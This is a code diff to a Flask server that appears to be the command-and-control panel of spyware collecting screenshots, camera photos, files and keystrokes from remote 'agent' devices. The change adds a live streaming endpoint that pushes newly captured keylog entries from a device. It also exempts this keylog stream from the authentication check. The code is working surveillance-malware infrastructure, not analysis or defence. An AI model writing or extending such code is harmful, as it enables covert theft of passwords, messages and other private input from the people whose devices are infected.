@@ -25,7 +25,9 @@ def _check_auth():
     # Agent endpoints /esp/, /apk/, /sh/ and the login route are always public
     pub = ("/esp/", "/apk/", "/sh/", "/login", "/api/cam/stream")
     # SSE stream endpoints: cookie works fine with EventSource
-    stream_ok = request.path.endswith("/screen-stream") or request.path.endswith("/cam-stream")
+    stream_ok = (request.path.endswith("/screen-stream") or
+                 request.path.endswith("/cam-stream") or
+                 request.path.endswith("/keylog-stream"))
     if request.path.startswith("/api/"):
         if not any(request.path.startswith(p) for p in pub) and not stream_ok:
             if request.cookies.get(_AUTH_COOKIE) != _AUTH_TOKEN:
@@ -64,8 +66,9 @@ _device      = {"connected": False, "hostname": None, "os": None,
 
 # ── Multi-device state (persistent agents) ───────────────────────────────────
 _devices = {}  # keyed by UUID device_id
-_screen_conds = {}  # did -> Condition, notified on new screenshot frame
-_cam_conds    = {}  # did -> Condition, notified on new camera photo
+_screen_conds  = {}  # did -> Condition, notified on new screenshot frame
+_cam_conds     = {}  # did -> Condition, notified on new camera photo
+_keylog_conds  = {}  # did -> Condition, notified on new keylog entries
 
 def _screen_cond(did):
     if did not in _screen_conds: _screen_conds[did] = Condition()
@@ -74,6 +77,10 @@ def _screen_cond(did):
 def _cam_cond(did):
     if did not in _cam_conds: _cam_conds[did] = Condition()
     return _cam_conds[did]
+
+def _keylog_cond(did):
+    if did not in _keylog_conds: _keylog_conds[did] = Condition()
+    return _keylog_conds[did]
 
 def _dev(did):
     if did not in _devices:
@@ -97,6 +104,7 @@ def _dev(did):
             "photos": collections.deque(maxlen=10),
             "files": {},
             "keylogs": collections.deque(maxlen=2000),
+            "keylog_live": [],   # latest ingest batch, drained by live SSE
         }
     return _devices[did]
 
@@ -1432,6 +1440,9 @@ def esp_device_keylog():
             for e in entries:
                 e["srv_ts"] = ts
                 d["keylogs"].appendleft(e)
+            d["keylog_live"] = list(entries)
+        cond = _keylog_cond(did)
+        with cond: cond.notify_all()
     return jsonify({"ok": True})
 
 @app.route("/api/devices/<did>/keylog")
@@ -1448,6 +1459,30 @@ def api_device_keylog_clear(did):
         if did in _devices:
             _devices[did]["keylogs"].clear()
     return jsonify({"ok": True})
+
+@app.route("/api/devices/<did>/keylog-stream")
+def api_keylog_stream(did):
+    """SSE endpoint — pushes keylog entries as they arrive from the device."""
+    def generate():
+        cond = _keylog_cond(did)
+        yield ": connected\n\n"
+        while True:
+            with cond:
+                cond.wait(timeout=30)
+            with lock:
+                d = _devices.get(did)
+                if not d: break
+                batch = d.get("keylog_live", [])
+                d["keylog_live"] = []
+            if batch:
+                import json as _json
+                yield "data: " + _json.dumps(batch) + "\n\n"
+            else:
+                yield ": keepalive\n\n"
+    return Response(stream_with_context(generate()),
+                    mimetype="text/event-stream",
+                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no",
+                             "Connection": "keep-alive"})
 
 # ── Device control page ───────────────────────────────────────────────────────
 
